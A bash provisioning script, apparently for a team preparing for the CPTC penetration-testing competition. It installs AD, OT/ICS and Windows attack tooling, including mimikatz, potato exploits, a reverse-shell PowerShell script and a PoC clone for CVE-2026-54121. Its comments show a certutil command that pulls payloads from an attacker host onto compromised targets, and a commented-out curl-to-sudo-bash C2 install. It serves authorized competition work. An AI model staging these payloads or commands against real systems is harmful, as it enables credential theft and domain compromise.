        pip_ensure Cryptodome pycryptodomex
        pip_ensure termcolor termcolor
        pip_ensure cprint cprint
    fi
    print_status "Run it with: python3 ~/dropzone/jwt_tool/jwt_tool.py <JWT>"
    fin_msg 'jwt_tool'
fi

print_status "Downloading ysoserial (Java deserialisation gadget chains)..."
# Not in Kali's repos - verified against the live index, unlike phpggc which is.
# It is a fat jar, so it needs a JRE; openjdk-11-jdk is in the apt list above and
# the verification block below proves 'java -version' actually runs.
if fetch_pinned ysoserial $USER_HOME/dropzone/ysoserial-all.jar; then
    print_status "Run it with: java -jar ~/dropzone/ysoserial-all.jar <gadget> '<cmd>'"
    print_status "  List gadgets: java -jar ~/dropzone/ysoserial-all.jar"
    fin_msg 'ysoserial'
fi

print_status "Installing additional useful Go tools..."
export GOPATH=$USER_HOME/go
# PREPEND, not append. This was `PATH=$PATH:$GOPATH/bin`, which puts /usr/bin
# first - so on any box where Kali already packages a tool we also `go install`
# (httpx, subfinder, nuclei...), the DISTRO binary won and the freshly built one
# we just spent minutes on was unreachable. Prepending makes the newer build win,
# which is the whole point of installing it.
export PATH=$GOPATH/bin:$PATH

# ...and persist it, because the export above dies with this shell. Without this
# the operator's next terminal has no ~/go/bin at all and the go tools simply are
# not there. Idempotent: keyed on a marker string, so re-runs do not stack up.
for rc in "$USER_HOME/.zshrc" "$USER_HOME/.bashrc"; do
    [ -f "$rc" ] || continue
    if ! grep -q 'cptc go+pipx PATH' "$rc" 2>/dev/null; then
        {
            echo ''
            echo '# cptc go+pipx PATH - prepended so locally built tools beat the distro copies'
            echo 'export PATH="$HOME/go/bin:$HOME/.local/bin:$PATH"'
        } >> "$rc"
        print_success "PATH for go/pipx added to $(basename "$rc")"
    else
        print_success "PATH for go/pipx already in $(basename "$rc")"
    fi
done
own_user "$USER_HOME/.zshrc" "$USER_HOME/.bashrc" 2>/dev/null

# go_install lives in lib.sh. The module path no longer carries the @version -
# it is the third argument, so these can be pinned without editing the path.
go_install httprobe    github.com/tomnomnom/httprobe
go_install waybackurls github.com/tomnomnom/waybackurls
go_install subfinder   github.com/projectdiscovery/subfinder/v2/cmd/subfinder
go_install httpx       github.com/projectdiscovery/httpx/cmd/httpx

# ---------------------------------------------------------------------------
# OT / ICS
# ---------------------------------------------------------------------------
# READ THE DOCTRINE BEFORE YOU RUN ANY OF THIS. See the KB, and osint/themepark-playbook.md.
#
# "Rides" at CPTC 11 (maritime) were web dashboards and raw TCP listeners - there
# was not one industrial protocol in the whole environment. These three tools are
# here for the case where CPTC 12 does ship real Modbus/OPC-UA, not because we
# expect it.
#
# THE RULE: prove reachability READ-ONLY, then STOP and escalate in character.
# modbuster can write coils and holding registers and opcattack can forge
# signatures. Do not use those paths against anything ride-, safety- or
# life-safety-shaped. Disrupting the environment is an explicit point loss and a
# DQ risk, and "we could have stopped a ride mid-cycle and chose to report it
# instead" is a stronger report line than a screenshot of having done it.
print_status "Installing OT/ICS tooling (read-only doctrine - see comments)..."
cd $USER_HOME/dropzone

# PINNED BELOW 2.x. This run installed asyncua 2.0.1 - a major version bump - and
# the OPC-UA client utilities we actually use on the day (uals / uaread / uawrite)
# have not been re-tested against it. A major bump landing untested days before a
# repo freeze is not a risk worth taking for a tool nobody will have time to debug
# on site. Re-test the three utilities, then lift the ceiling deliberately.
pip_ensure asyncua "asyncua<2"    # OPC-UA client library; also opcattack's dependency

# icspacket is the broad-coverage one: DNP3 (IEEE 1815), MMS (ISO 9506) + IEC 61850,
# IEC 60870-5-104, EtherNet/IP (CIP), BACnet/IP, plus Modbus and OPC-UA which it
# layers on pymodbus and asyncua respectively. Ships prebuilt Linux wheels for
# Python 3.10-3.14, so it should not need a compiler on Kali's 3.13.
# It is a LIBRARY, not a CLI - you write a few lines of Python against it. That is
# the right shape for the read-only doctrine above: a scripted read is easier to
# keep harmless, and easier to put in the report, than an interactive attack tool.
# icspacket: WHEEL FIRST, THEN BUILD FROM THE TAGGED SOURCE.
# The clean-VM run failed here with a message that reads like the package does
# not exist:
#     ERROR: Could not find a version that satisfies the requirement icspacket
#            (from versions: none)
# It does exist. icspacket 0.3.1 publishes ONLY pre-built C-extension wheels for
# cp310-cp313 and NO sdist, and Kali rolling has moved to Python 3.14 (3.14.7 on
# the test box - start.sh's own log shows the 3.13 -> 3.14 jump). pip therefore
# finds zero installable files. Upstream's "Python :: 3.14" classifier is
# aspirational; there is no cp314 wheel behind it.
#
# Building from source works and is verified, not assumed: on Python 3.14.7 the
# tag below builds icspacket-0.3.1-cp314-cp314-linux_x86_64.whl and imports
# cleanly. scikit-build-core needs cmake + ninja + gcc, which the toolchain block
# after the apt phase installs.
#
# The tag is pinned rather than tracking the default branch: this is a source
# build of third-party code, so "whatever is on master today" is not acceptable.
ICSPACKET_TAG=v0.3.1
if python3 -c "import icspacket" &>/dev/null; then
    print_success "python: icspacket already present (skip)"
elif pip install icspacket --break-system-packages 2>/dev/null; then
    print_success "python: icspacket installed (upstream wheel)"
elif pip install "git+https://github.com/MatrixEditor/icspacket@${ICSPACKET_TAG}" \
        --break-system-packages; then
    print_success "python: icspacket built from source (${ICSPACKET_TAG})"
else
    print_warning "python: icspacket FAILED - no wheel for this Python and the source build failed"
    print_warning "  needs cmake + ninja + gcc; check the toolchain block above succeeded"
fi

if clone_pinned opcattack https://github.com/bvcyber/opcattack "$USER_HOME/dropzone/opcattack"; then
    # UNPIN THE REQUIREMENTS, then install one name at a time.
    # Upstream's requirements.txt is fully "==" pinned to 2024 versions and
    # CANNOT install on Kali's Python 3.14: cffi==1.16.0 has no cp314 wheel and
    # will not build. pip resolves a -r file as ONE transaction, so that single
    # bad pin took the entire list down with it - including keepalive-socket,
    # which provides the `keepalive` module opcattack imports at attacks.py:21.
    # The build then printed "dependencies failed" and the verification pass
    # printed "opcattack verified" on the next screen, which is the lie fixed
    # separately in the check pattern.
    #
    # Those pins are the author's 2024 dev box, not a security boundary -
    # certifi, cffi, cryptography, requests, urllib3 and pycparser all ship
    # current on Kali and satisfy the imports fine. Dropping the "==" lets them.
    # One pip call per name so a single unsatisfiable dependency cannot take the
    # rest with it, which is the whole lesson of the pwntools failure.
    if [ -f "$USER_HOME/dropzone/opcattack/requirements.txt" ]; then
        OPCA_FAILED=()
        while read -r dep; do
            [ -n "$dep" ] || continue
            pip install "$dep" --break-system-packages >/dev/null 2>&1 \
                || OPCA_FAILED+=("$dep")
        done < <(sed 's/[=<>!~].*//' "$USER_HOME/dropzone/opcattack/requirements.txt" | tr -d '\r' | grep -v '^\s*$')
        if [ ${#OPCA_FAILED[@]} -eq 0 ]; then
            print_success "opcattack dependencies installed (pins relaxed)"
        else
            print_warning "opcattack deps that failed: ${OPCA_FAILED[*]}"
        fi
        # The import that actually decides whether the tool runs.
        if python3 -c "import keepalive" 2>/dev/null; then
            print_success "opcattack: keepalive module present"
        else
            print_warning "opcattack: 'keepalive' still missing - opcattack.py will not import"
        fi
    fi
    chmod 0755 "$USER_HOME/dropzone/opcattack/opcattack.py" 2>/dev/null
    print_status "Run it with: python3 ~/dropzone/opcattack/opcattack.py --help"
    fin_msg 'opcattack'
fi

if command -v modbuster &>/dev/null; then
    print_success "modbuster already installed"
elif clone_pinned modbuster https://github.com/TacticalGator/modbuster "$USER_HOME/dropzone/modbuster"; then
    # Upstream ships a pyproject and recommends pipx; fall back to pip so a box
    # without pipx still ends up with the tool.
    if command -v pipx &>/dev/null && pipx install "$USER_HOME/dropzone/modbuster" 2>/dev/null; then
        print_success "modbuster installed via pipx"
        fin_msg 'modbuster'
    elif pip install "$USER_HOME/dropzone/modbuster" --break-system-packages; then
        print_success "modbuster installed via pip"
        fin_msg 'modbuster'
    else
        print_warning "modbuster install failed - run it from $USER_HOME/dropzone/modbuster instead"
    fi
fi
fin_msg 'OT/ICS Tools'

# ---------------------------------------------------------------------------
# MOBILE  (--mobile only)
# ---------------------------------------------------------------------------
# Per the KB this is a TIME-BOXED HEDGE, not a discipline: there is no evidence
# mobile has ever been in scope, and the useful flow is ~90 minutes of
# apktool -> jadx -> grep -> hand the endpoint list to the web team.
if [ "$WANT_MOBILE" -eq 1 ]; then
    print_status "Installing mobile tooling (--mobile)..."
    # jadx pulls default-jre and is ~69 MB; the other three are under 1 MB together.
    apt_install jadx adb apktool openssl
    pip_ensure frida frida-tools

    # Android Studio: 1.5 GB download, ~4 GB installed - the single largest item in
    # this repo. Its EMULATOR needs nested virtualisation, which a VDI almost
    # certainly does not expose, so treat this as an APK/layout inspector rather
    # than assuming you can run an app on it.
    if [ -d /opt/android-studio ]; then
        print_success "Android Studio already installed at /opt/android-studio (skip)"
    else
        print_warning "Android Studio is a 1.5 GB download and ~4 GB on disk. Fetching..."
        if fetch_pinned android_studio $USER_HOME/dropzone/android-studio.tar.gz; then
            if sudo tar -xzf $USER_HOME/dropzone/android-studio.tar.gz -C /opt; then
                sudo ln -sf /opt/android-studio/bin/studio.sh /usr/local/bin/android-studio
                print_success "Android Studio installed -> run: android-studio"
                # Reclaim the 1.5 GB immediately; /opt/android-studio is the skip test.
                rm -f $USER_HOME/dropzone/android-studio.tar.gz
                fin_msg 'Android Studio'
            else
                print_warning "Android Studio extraction failed - is there enough disk?"
            fi
        fi
    fi
    fin_msg 'Mobile Tools'
else
    print_status "Skipping the mobile kit - run with --mobile for jadx/apktool/adb/frida + Android Studio."
fi

fi   # end of "$WANT_REST" install block

# ---------------------------------------------------------------------------
if [ "$WANT_AD" -eq 1 ]; then
# ===========================================================================
# AD / INTERNAL
# ===========================================================================
# Merged in from ad.sh, which no longer exists as a separate build step. It was
# always run immediately after this script, against the same box, sourcing the
# same lib.sh, and it carried its own copy of the ~80-line verification helper
# block - so the two drifted and the helpers had to be fixed twice. One script,
# one apt list, one verification pass, one summary.
#
# Everything here is skipped by --no-ad, and --ad-only runs ONLY this section
# (which is exactly what typing ad.sh used to do).

print_status "Installing AD / internal tooling..."
# DEDUPED against the main apt list above: enum4linux, docker.io, responder,
# netexec and unzip used to appear in BOTH lists. apt_install is idempotent so the
# second pass was only a dpkg query, but a package listed twice is a package that
# gets changed in one place and not the other.
apt_install \
    impacket-scripts bloodhound.py bloodhound-ce-python bloodhound neo4j \
    certipy-ad evil-winrm \
    build-essential python3-dev libffi-dev cmake \
    ldap-utils krb5-user libkrb5-dev freerdp3-x11 ntpsec-ntpdate
# The five packages on the last line, and why each earns its place (~1 MB total):
#  * ldap-utils     - ldapsearch. It was in smol-all.sh's AD set and NOT here, which
#                     the emergency script's own comment called "a real gap in the
#                     main build". This closes it.
#  * krb5-user      - kinit / klist / kdestroy. Every impacket and certipy workflow
#                     that passes a ccache through KRB5CCNAME needs these, and none
#                     of them were installed. apt_install runs with
#                     DEBIAN_FRONTEND=noninteractive, which matters here: krb5-user
#                     otherwise opens a debconf dialog asking for the default realm.
#  * libkrb5-dev    - the GSSAPI headers powerview.py needs to build below.
#  * freerdp3-x11   - xfreerdp3. remmina is a GUI client; this one scripts, and
#                     does pass-the-hash with /pth:. Package is freerdp3-x11 on
#                     current Kali - freerdp2-x11 no longer exists.
#  * ntpsec-ntpdate - NOTE: the plain 'ntpdate' package has been REMOVED from Kali
#                     (verified against the live index: it resolves, but with no
#                     installation candidate). ntpsec-ntpdate is the replacement and
#                     still gives you /usr/sbin/ntpdate. Clock skew against the DC
#                     is what produces KRB_AP_ERR_SKEW and kills every Kerberos
#                     attack you are about to run:  sudo ntpdate <dc-ip>

# bloodhound-ce-python closes a REAL BUG that was in this script, not a nicety.
# Kali ships the two BloodHound Python collectors as two different packages:
#     bloodhound.py        -> emits LEGACY (BloodHound <= 4.3.1) format
#     bloodhound-ce-python -> emits CE format
# This script installed apt 'bloodhound' (which is BloodHound *CE* 9.4.0) together
# with ONLY the legacy collector. Upstream is explicit that the two formats cannot
# be mixed - a legacy collection fails at ingest into CE, it does not degrade
# gracefully. So the graph path in this build was broken end-to-end and nobody had
# noticed, because nobody had run collector -> ingest on a freshly built box.
# Both are installed now because we deliberately run BOTH viewers; see the block
# below for which collector feeds which.

# Database setup - IMPORTANT, verified live on Kali:
#  * Kali's 'bloodhound' is BloodHound CE 9.4.0. It runs its OWN database stack and
#    is set up/launched via bloodhound-setup / bloodhound-start (prints its own admin
#    creds). It does NOT use the system neo4j with a password we set.
#  * Kali's 'neo4j' package ships ONLY /usr/bin/neo4j - there is NO systemd unit, NO
#    neo4j-admin and NO cypher-shell, so the password CANNOT be set non-interactively,
#    and auto-starting it can clash on 7474/7687 with BloodHound CE.
# So we do NOT auto-start/pw-set neo4j (it would fail or conflict); we configure the
# harmless listen address and document the one command each path actually needs.
print_status "Configuring system Neo4j listen address (harmless if unused)..."
if [ -f "/etc/neo4j/neo4j.conf" ]; then
    sudo sed -i 's/#dbms.default_listen_address=0.0.0.0/dbms.default_listen_address=0.0.0.0/' /etc/neo4j/neo4j.conf
    print_success "Neo4j listen address configured"
fi
print_status "Database launch is one manual command (by design - avoids port clashes):"
print_status "  BloodHound CE : sudo bloodhound-setup   (first run, PRINTS admin creds)  then  sudo bloodhound-start"
print_status "  Raw neo4j     : sudo neo4j start         (default neo4j/neo4j; browser forces a new pw on first login)"

# TWO GRAPH STACKS, ON PURPOSE. Get this wrong and the ingest fails outright.
#
#   LEGACY  BloodHound 4.3.1 on the Windows box (installed by windows.ps1)
#           fed by:  bloodhound-python          (apt 'bloodhound.py')
#                    ~/dropzone/windows/legacy/SharpHound.exe   (v1.1.x)
#
#   CE      BloodHound CE 9.4.0 here on Kali   (sudo bloodhound-start)
#           fed by:  bloodhound-ce-python
#                    ~/dropzone/windows/ce/SharpHound.exe       (v2.x)
#                    azurehound                                 (installed above)
#
# WHY BOTH, rather than picking one:
#  * The Windows box is the team's offline graph viewer and it CANNOT run CE. CE is
#    a Docker Compose stack whose only Windows install path is Docker Desktop, and
#    Docker Desktop is unsupported on Windows Server - any edition. So a viewer on
#    that box has to be legacy.
#  * CE cannot be dropped from Kali either: AzureHound v3 emits CE format only, and
#    the cloud -> on-prem path landing in one graph is the entire reason AzureHound
#    is in all.sh. Legacy 4.3.1 cannot ingest it.
# Hence: legacy for the Windows viewer, CE for Kali and anything Azure.
print_warning "BloodHound: legacy on Windows, CE here. Do NOT mix collections -"
print_warning "  legacy collector -> BloodHound 4.3.1 (Windows)   [bloodhound-python, SharpHound 1.x]"
print_warning "  CE collector     -> BloodHound CE here           [bloodhound-ce-python, SharpHound 2.x, azurehound]"
print_warning "  Mixing them fails at ingest. Collectors are split into windows/legacy and windows/ce."
fin_msg 'Database guidance'



print_status "Cloning Ghostpack compiled binaries..."
if clone_pinned Ghostpack-CompiledBinaries \
        https://github.com/r3motecontrol/Ghostpack-CompiledBinaries \
        "$USER_HOME/dropzone/Ghostpack-CompiledBinaries"; then
    bin_count=$(find "$USER_HOME/dropzone/Ghostpack-CompiledBinaries" -name "*.exe" | wc -l)
    print_success "Ghostpack: $bin_count executables"
    fin_msg 'Ghostpack Compiled Binaries'
fi

print_status "Installing SharpEfsPotato (requires mono for building)..."
if ! command -v mono &> /dev/null; then
    print_status "Installing mono for C# compilation..."
    # Routed through apt_install rather than a bare apt-get: that gets the retry
    # and, more to the point, gets mono into APT_FAILED if it does not arrive.
    # It used to be a bare call whose exit status was never checked, so a mirror
    # fault here produced no message at all - and the SharpEfsPotato "verified"
    # line below only counts files in the clone, so a box with no mono and an
    # unbuilt .exe still reported success.
    apt_install mono-complete mono-devel
fi

if [ ! -d "$USER_HOME/dropzone/SharpEfsPotato" ]; then
    if clone_pinned SharpEfsPotato https://github.com/bugch3ck/SharpEfsPotato \
            "$USER_HOME/dropzone/SharpEfsPotato"; then
        cd "$USER_HOME/dropzone/SharpEfsPotato" || print_warning "cd SharpEfsPotato failed - skipping build"
        # '[ -f "*.csproj" ]' was a QUOTED glob: test never expands it, so it looked for
        # a file literally named '*.csproj' and could never match. Dead branch.
        if [ -f "SharpEfsPotato.sln" ] || compgen -G "*.csproj" >/dev/null 2>&1; then
            print_status "Building SharpEfsPotato with mono..."
            if msbuild SharpEfsPotato.sln 2>/dev/null || xbuild SharpEfsPotato.sln 2>/dev/null; then
                print_success "SharpEfsPotato built successfully"
            else
                print_warning "SharpEfsPotato build failed, check $USER_HOME/dropzone/SharpEfsPotato for manual build"
            fi
        fi
        cd "$USER_HOME/dropzone" || print_warning "could not return to dropzone"
        fin_msg 'SharpEfsPotato'
    else
        print_warning "SharpEfsPotato clone failed"
    fi
else
    print_success "SharpEfsPotato already exists"
fi

print_status "Installing NetExec (nxc)..."
if command -v nxc &> /dev/null || command -v netexec &> /dev/null; then
    # Provided by the apt 'netexec' package above (packaged deps, no aardwolf build).
    print_success "NetExec present: $(nxc --version 2>&1 | head -n1 || echo installed)"
    fin_msg 'NetExec (nxc)'
else
    print_warning "apt netexec unavailable - falling back to pipx build..."
    if ! command -v pipx &> /dev/null; then
        pip install --user pipx --break-system-packages
        python3 -m pipx ensurepath
    fi
    if pipx install git+https://github.com/Pennyw0rth/NetExec; then
        print_success "NetExec installed via pipx"
        fin_msg 'NetExec (nxc)'
    else
        print_warning "NetExec install failed - check build-essential/python3-dev are present"
    fi
fi

print_status "Verifying Certipy (installed via apt 'certipy-ad' above)..."
# Dedup: previously installed 3 ways (apt + git clone + pip). Keep only the apt
# package; just confirm the command is present here.
if command -v certipy-ad &> /dev/null || command -v certipy &> /dev/null; then
    print_success "Certipy present: $(certipy-ad --version 2>&1 | head -n1 || certipy --version 2>&1 | head -n1 || echo installed)"
    fin_msg 'Certipy'
else
    print_warning "certipy not found - apt 'certipy-ad' may have failed; see APT summary at end"
fi

print_status "Installing PKINITtools..."
clone_pinned PKINITtools https://github.com/dirkjanm/PKINITtools "$USER_HOME/dropzone/PKINITtools"
pip_ensure minikerberos minikerberos   # already installed above; pip_ensure skips it
fin_msg 'PKINITtools'

print_status "Installing bloodyAD..."
# ldap3 explicitly, not just as a transitive dep of the requirements.txt below:
# the verification pass checks for it by name, and a check whose only installer is
# "some other package's requirements file happened to pull it" is the bug that lost
# us pwntools. pip_ensure is an import check first, so this is free when it is there.
pip_ensure ldap3 ldap3
clone_pinned bloodyAD https://github.com/CravateRouge/bloodyAD.git "$USER_HOME/dropzone/bloodyAD"
if [ -d "$USER_HOME/dropzone/bloodyAD" ]; then
    if cd "$USER_HOME/dropzone/bloodyAD"; then
        if pip install -r requirements.txt --break-system-packages; then
            print_success "bloodyAD dependencies installed"
        else
            print_warning "bloodyAD dependencies installation failed"
        fi
        cd "$USER_HOME/dropzone" || print_warning "could not return to dropzone"
        fin_msg 'bloodyAD'
    else
        print_warning "bloodyAD directory is not usable - skipping its dependencies"
    fi
fi

print_status "Installing PowerView.py..."
# The Python port of PowerSploit's PowerView - domain enumeration in the shape the
# AD playbooks are written in. Kali packages python3-pywerview, which is a DIFFERENT
# and much older rewrite; this is aniqfakhrul's. It builds a gssapi extension, which
# is why libkrb5-dev is in the apt list above - without those headers pip fails on
# the gssapi wheel.
pip_ensure powerview powerview
fin_msg 'PowerView.py'

print_status "Installing pywhisker (Shadow Credentials)..."
# Completes a chain that was otherwise missing its first link: certipy-ad and
# PKINITtools are both already installed, but nothing here could WRITE
# msDS-KeyCredentialLink in the first place.
# Installed from the official ShutdownRepo repository rather than the PyPI package
# of the same name, which is published by a third party and self-describes as
# "Unofficial". For a tool that handles domain credentials, prefer upstream.
if clone_pinned pywhisker https://github.com/ShutdownRepo/pywhisker "$USER_HOME/dropzone/pywhisker"; then
    if ! cd "$USER_HOME/dropzone/pywhisker"; then
        print_warning "pywhisker directory is not usable - skipping its install"
    elif pip install . --break-system-packages; then
        print_success "pywhisker installed (command: pywhisker)"
    elif pip install -r requirements.txt --break-system-packages; then
        print_warning "pywhisker package install failed; dependencies are in, run it from the clone:"
        print_warning "  python3 $USER_HOME/dropzone/pywhisker/pywhisker/pywhisker.py -h"
    else
        print_warning "pywhisker install failed"
    fi
    cd "$USER_HOME/dropzone" || print_warning "could not return to dropzone"
    fin_msg 'pywhisker'
fi

print_status "Installing targetedKerberoast..."
# Kerberoasting against accounts that have no SPN: add one, roast it, remove it.
# A single script, so it runs from the clone - there is nothing to install.
if clone_pinned targetedKerberoast https://github.com/ShutdownRepo/targetedKerberoast \
        "$USER_HOME/dropzone/targetedKerberoast"; then
    chmod 0755 "$USER_HOME/dropzone/targetedKerberoast/targetedKerberoast.py" 2>/dev/null
    if [ -f "$USER_HOME/dropzone/targetedKerberoast/requirements.txt" ]; then
        pip install -r "$USER_HOME/dropzone/targetedKerberoast/requirements.txt" --break-system-packages \
            && print_success "targetedKerberoast dependencies installed" \
            || print_warning "targetedKerberoast dependencies failed - it may not run"
    fi
    print_status "Run it with: python3 ~/dropzone/targetedKerberoast/targetedKerberoast.py -h"
    fin_msg 'targetedKerberoast'
fi

print_status "Installing Kerbrute..."
if fetch_pinned kerbrute /usr/local/bin/kerbrute sudo && sudo chmod 0755 /usr/local/bin/kerbrute; then
    kerbrute_version=$(kerbrute version 2>&1 || echo "installed")
    print_success "Kerbrute installed: $kerbrute_version"
    fin_msg 'Kerbrute'
else
    print_warning "Kerbrute installation failed"
fi

print_status "Installing windapsearch..."
if fetch_pinned windapsearch /usr/local/bin/windapsearch sudo && sudo chmod 0755 /usr/local/bin/windapsearch; then
    print_success "windapsearch installed to /usr/local/bin/windapsearch"
    fin_msg 'windapsearch'
else
    print_warning "windapsearch installation failed"
fi

print_status "Verifying Impacket (installed via apt 'impacket-scripts' above)..."
# Dedup: was installed via both apt AND pipx. Keep the apt package; confirm here.
if command -v impacket-secretsdump &> /dev/null || python3 -c "import impacket" &> /dev/null; then
    print_success "Impacket present"
    fin_msg 'Impacket'
else
    print_warning "Impacket not found - apt 'impacket-scripts' may have failed; see APT summary at end"
fi

# print_status "Installing Sliver C2 Framework..."
# if ! command -v sliver &> /dev/null; then
#     if curl -s https://sliver.sh/install | sudo bash; then
#         print_success "Sliver installed"

#         if [ -f "/root/sliver-server" ]; then
#             sudo cp /root/sliver-server /usr/bin/ 2>/dev/null || print_warning "Could not copy sliver-server from /root"
#         fi

#         if sudo systemctl enable sliver 2>/dev/null && sudo systemctl start sliver 2>/dev/null; then
#             print_success "Sliver service enabled and started"
#         else
#             print_warning "Sliver service configuration failed (may not have systemd unit)"
#         fi
#         fin_msg 'Sliver C2'
#     else
#         print_warning "Sliver installation failed"
#     fi
# else
#     print_success "Sliver already installed"
#     sliver_version=$(sliver version 2>&1 | head -n1 || echo "installed")
#     print_status "Sliver version: $sliver_version"
# fi

# ---------------------------------------------------------------------------
# LINUX-SIDE AD TOOLS THAT WERE MISSING
# ---------------------------------------------------------------------------
# These three were only ever available to this team inside the previous roster's
# 72 MB AD_Tools.zip, which is not in this repo. They run on Kali.
# A failed cd must NOT abort the script any more. These blocks came from ad.sh,
# where they were the last thing that ran, so 'exit 1' only cost you the tail of
# a near-finished script. In the merged script the verification pass, the APT
# failure list and the pin summary all come AFTER this - so one interrupted clone
# would silently take the entire diagnostic half of the run with it. Warn, skip
# the block, carry on; the verification pass is what reports the damage.
cd "$USER_HOME/dropzone" || print_warning "could not cd to dropzone - clones may land elsewhere"

print_status "Installing krbrelayx (coercion + unconstrained-delegation relay)..."
# The coercion/relay half of the AD toolkit was entirely absent: PKINITtools and
# certipy cover certificates, nothing covered printerbug/PetitPotam-style coercion
# or relaying to LDAP. printerbug.py, addspn.py and dnstool.py all live here.
if clone_pinned krbrelayx https://github.com/dirkjanm/krbrelayx "$USER_HOME/dropzone/krbrelayx"; then
    chmod 0755 "$USER_HOME/dropzone/krbrelayx"/*.py 2>/dev/null
    print_status "  coerce:  python3 ~/dropzone/krbrelayx/printerbug.py -h"
    print_status "  relay:   python3 ~/dropzone/krbrelayx/krbrelayx.py -h"
    fin_msg 'krbrelayx'
fi

print_status "Installing gMSADumper (group-managed service account passwords)..."
if clone_pinned gMSADumper https://github.com/micahvandeusen/gMSADumper "$USER_HOME/dropzone/gMSADumper"; then
    print_status "  python3 ~/dropzone/gMSADumper/gMSADumper.py -u <user> -p <pass> -d <domain>"
    fin_msg 'gMSADumper'
fi

print_status "Installing KeyTabExtract (NTLM hashes out of a captured .keytab)..."
if clone_pinned KeyTabExtract https://github.com/sosdave/KeyTabExtract "$USER_HOME/dropzone/KeyTabExtract"; then
    fin_msg 'KeyTabExtract'
fi

# ---------------------------------------------------------------------------
# CERTIGHOST - CVE-2026-54121  (AD CS, patched 2026-07-14, public PoC 2026-07-24)
# ---------------------------------------------------------------------------
# A low-privileged authenticated domain user makes the CA chase an attacker-
# controlled host for identity data, then issues a certificate under a DOMAIN
# CONTROLLER's identity -> PKINIT -> tickets as a DC -> DCSync / krbtgt.
# CVSS 8.8. Patched in Microsoft's July 2026 updates.
#
# WHY IT IS HERE: the theme is an "aging" estate, the environment is built months
# before we see it, and a July 2026 patch is exactly the one an October 2026 build
# misses. Precedent: the CPTC 11 client-email library shipped pre-written
# notifications for React2shell and MongoBleed, so topical CVEs do get planted.
#
# IT IS CLONED, NOT COMMITTED. An unvetted 2026 exploit script does not belong in
# a public repo we are liable for and may be asked to demonstrate (rules §4.3).
# It lands on the box the same way PKINITtools and bloodyAD do.
#
# ESTABLISH EXPOSURE READ-ONLY FIRST - certipy is already installed:
#     certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
# This is a full domain-compromise primitive. Confirm the finding, write it up,
# and only fire the PoC deliberately. ***READ THIS SCRIPT BEFORE THE FREEZE.***
print_status "Installing Certighost PoC (CVE-2026-54121)..."
if clone_pinned certighost https://github.com/aniqfakhrul/CVE-2026-54121 \
        "$USER_HOME/dropzone/certighost"; then
    if [ -f "$USER_HOME/dropzone/certighost/requirements.txt" ]; then
        pip install -r "$USER_HOME/dropzone/certighost/requirements.txt" --break-system-packages \
            && print_success "certighost dependencies installed" \
            || print_warning "certighost dependencies failed - it may not run"
    fi
    print_warning "UNVETTED third-party exploit. Read it before the repo freeze."
    print_status "  Enumerate first, read-only:  certipy find ... -vulnerable -stdout"
    fin_msg 'Certighost (CVE-2026-54121)'
fi

# ---------------------------------------------------------------------------
# WINDOWS PAYLOAD SET  ->  ~/dropzone/windows/
# ---------------------------------------------------------------------------
# These do not run on this box and they do not run on our Windows box either.
# They are UPLOADED to compromised Windows targets, served off Kali:
#     kali$   cd ~/dropzone/windows && python3 -m http.server 9999
#     target> certutil -urlcache -split -f http://<kali>:9999/Rubeus.exe rb.exe
# The directory is deliberately a FLAT http root so the certutil/iwr line is short
# under pressure; only the two SharpHound generations are kept apart, because
# grabbing the wrong one costs you an ingest.
#
# This replaces the previous roster's checked-in AD_Tools.zip: the same tool set,
# minus the duplicates of things the build already pins, minus a leftover Kerberos
# ccache and krbrelayx hash file that should never have been in a public repo, and
# minus the script-block-logging bypass - which buys nothing when no blue team is
# scoring us and contradicts the engagement-evidence layer this repo is built on.
WINDIR="$USER_HOME/dropzone/windows"
WINDIR_OK=1
if ! mkdir -p "$WINDIR/legacy" "$WINDIR/ce"; then
    # Do NOT blank WINDIR here: every fetch below interpolates it, so an empty
    # value would aim the whole payload set at /. Skip the section instead.
    print_error "Cannot create $WINDIR - SKIPPING the Windows payload set"
    WINDIR_OK=0
fi
if [ "$WINDIR_OK" -eq 1 ]; then
print_status "Building the Windows payload set in $WINDIR ..."

# --- single-file payloads --------------------------------------------------
fetch_pinned printspoofer64 "$WINDIR/PrintSpoofer64.exe"
fetch_pinned godpotato      "$WINDIR/GodPotato-NET4.exe"
fetch_pinned juicypotato    "$WINDIR/JuicyPotato.exe"
fetch_pinned semanagevolume "$WINDIR/SeManageVolumeExploit.exe"
fetch_pinned lazagne        "$WINDIR/LaZagne.exe"
fetch_pinned adpeas         "$WINDIR/adPEAS.ps1"
fetch_pinned powerview_ps1  "$WINDIR/PowerView.ps1"
fetch_pinned powermad       "$WINDIR/Powermad.ps1"
fetch_pinned invoke_runascs "$WINDIR/Invoke-RunasCs.ps1"
fetch_pinned sessiongopher  "$WINDIR/SessionGopher.ps1"
fetch_pinned invoke_psh_tcp "$WINDIR/Invoke-PowerShellTcp.ps1"

# --- archives: fetch, unpack, keep only what gets uploaded -----------------
# mimikatz ships 32- and 64-bit plus a driver; we only ever upload x64.
if fetch_pinned mimikatz "$WINDIR/mimikatz_trunk.zip"; then
    if unzip -o -q -j "$WINDIR/mimikatz_trunk.zip" 'x64/mimikatz.exe' -d "$WINDIR" 2>/dev/null; then
        print_success "mimikatz.exe extracted"
        rm -f "$WINDIR/mimikatz_trunk.zip"
    else
        print_warning "could not extract x64/mimikatz.exe - zip left in place to unpack by hand"
    fi
fi

if fetch_pinned accesschk "$WINDIR/AccessChk.zip"; then
    unzip -o -q -j "$WINDIR/AccessChk.zip" 'accesschk64.exe' -d "$WINDIR" 2>/dev/null \
        && { print_success "accesschk64.exe extracted"; rm -f "$WINDIR/AccessChk.zip"; } \
        || print_warning "AccessChk.zip left in place - unpack by hand"
fi

# PSTools stays a directory: PsExec is the headline but PsLoggedon/PsService/
# PsLogList all get used, and Microsoft ships them as one archive.
if fetch_pinned pstools "$WINDIR/PSTools.zip"; then
    if unzip -o -q "$WINDIR/PSTools.zip" -d "$WINDIR/pstools" 2>/dev/null; then
        print_success "PSTools extracted -> $WINDIR/pstools/"
        rm -f "$WINDIR/PSTools.zip"
    else
        print_warning "PSTools.zip left in place - unpack by hand"
    fi
fi

# --- the two SharpHounds, kept apart. See the manifest note in lib.sh. -----
# 1.x -> LEGACY format -> BloodHound 4.3.1 on the Windows box
# 2.x -> CE format     -> BloodHound CE on this box
if fetch_pinned sharphound_legacy "$WINDIR/legacy/sharphound-legacy.zip"; then
    unzip -o -q "$WINDIR/legacy/sharphound-legacy.zip" -d "$WINDIR/legacy" 2>/dev/null \
        && { print_success "SharpHound 1.1.1 (LEGACY format) -> $WINDIR/legacy/"
